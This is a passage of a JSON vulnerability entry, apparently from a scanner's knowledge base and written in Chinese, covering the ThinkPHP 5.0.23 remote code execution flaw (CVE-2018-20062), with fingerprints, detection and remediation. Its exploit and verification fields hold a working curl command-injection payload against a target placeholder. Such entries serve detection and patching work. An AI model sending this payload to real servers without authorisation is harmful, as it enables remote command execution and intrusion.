{
  "vuln_id": "thinkphp_5023",
  "description": "ThinkPHP 5.0.23及之前版本中，获取method的方法未正确处理，允许攻击者调用Request类任意方法，导致远程代码执行漏洞。",
  "category": "expression_injection",
  "cves": [
    "CVE-2018-20062"
  ],
  "match_keywords": [
    "ThinkPHP",
    "5.0.23",
    "RCE",
    "远程代码执行",
    "thinkphp_5023",
    "CVE-2018-20062"
  ],
  "fingerprint_keywords": [
    "ThinkPHP",
    "5.0.23",
    "欢迎页面",
    "默认端口8080"
  ],
  "affected_versions": "ThinkPHP 5.0.23及之前版本",
  "default_port": 8080,
  "common_endpoints": [
    "/index.php?s=captcha"
  ],
  "detection_method": "发送POST请求到 /index.php?s=captcha，包含payload _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id，如果响应体包含命令执行结果（如uid=33(www-data)），则漏洞存在。",
  "exploit_steps": [
    {
      "step": 1,
      "description": "发送恶意POST请求执行命令",
      "command": "curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' \"http://{TARGET}:8080/index.php?s=captcha\"",
      "expected_result": "响应体中返回命令执行结果，例如 uid=33(www-data)。",
      "notes": "确保目标运行在默认端口8080，如果端口不同，需调整命令中的端口号。"
    }
  ],
  "verification_command": "curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' \"http://{TARGET}:8080/index.php?s=captcha\"",
  "verification_success_sign": "响应体包含命令执行输出，如 uid=33(www-data)。",
  "requires_callback": false,
  "callback_note": "此漏洞不需要目标回连攻击机，可直接通过HTTP响应回显命令结果。",
  "remediation": "升级ThinkPHP到5.0.24或更高版本，或应用官方补丁（如GitHub提交4a4b5e64fa4c46f851b4004005bff5f3196de003）。",
  "tags": [
    "RCE",
    "ThinkPHP",
    "PHP",
    "expression_injection",
    "web"
  ],
